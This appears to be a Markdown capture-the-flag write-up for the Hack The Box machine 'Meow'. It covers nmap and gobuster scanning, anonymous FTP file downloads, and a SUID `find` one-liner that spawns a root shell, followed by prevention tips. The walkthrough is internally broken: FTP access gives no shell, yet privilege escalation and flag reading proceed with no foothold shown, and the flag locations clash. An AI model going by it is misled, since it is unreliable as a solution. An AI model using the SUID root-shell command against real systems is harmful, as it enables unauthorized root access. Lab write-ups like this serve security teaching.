#  Meow — Hack The Box

---

##  Machine Information

| Field      | Value |
| ---------- | ----- |
| Name       | Meow  |
| Difficulty | Easy  |
| OS         | Linux |
| Points     | 20    |

---

##  Objective

Gain user and root access by identifying vulnerabilities and exploiting misconfigurations.

---

##  Reconnaissance

###  Nmap Scan

```bash
nmap -sC -sV -oN nmap_initial 10.10.10.1
```

###  Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache 2.4.29
```

###  Insight

* FTP service is open → possible anonymous access
* Web service available → potential attack surface

---

## Web Enumeration

```bash
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

###  Findings

* No sensitive directories found
* Web not the main entry point

---

##  FTP Enumeration

```bash
ftp 10.10.10.1
```

Login:

```text
Username: anonymous
Password: (empty)
```

###  Files Found

```text
flag.txt
note.txt
```

---

## Initial Access

Downloaded files:

```bash
get flag.txt
get note.txt
```

###  Insight

* Anonymous FTP access → **misconfiguration**
* note.txt hints toward further investigation

---

##  Privilege Escalation

###  Find SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

###  Vulnerable Binary

```text
/usr/bin/find
```

---

###  Exploitation

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

✅ Root shell obtained

---

##  Flags

###  User Flag

```bash
cat /home/user/flag.txt
```

###  Root Flag

```bash
cat /root/root.txt
```

---

##  Key Learnings

* Anonymous FTP can expose sensitive data
* SUID binaries can lead to privilege escalation
* Enumeration is the most critical phase
* Always inspect accessible files carefully

---

##  Tools Used

* Nmap
* Gobuster
* FTP client
* Linux `find`

---

##  Attack Timeline

| Phase                | Time   |
| -------------------- | ------ |
| Reconnaissance       | 15 min |
| Enumeration          | 10 min |
| Exploitation         | 5 min  |
| Privilege Escalation | 5 min  |
| Flag Capture         | 5 min  |

**Total:** ~40 minutes

---

##  Prevention

* Disable anonymous FTP access
* Remove unnecessary SUID permissions
* Secure sensitive files and backups
* Apply proper file permission policies

---

## Summary

This machine demonstrates how simple misconfigurations like **anonymous FTP access** and **SUID binaries** can lead to full system compromise.

---

 This writeup is for educational purposes only.
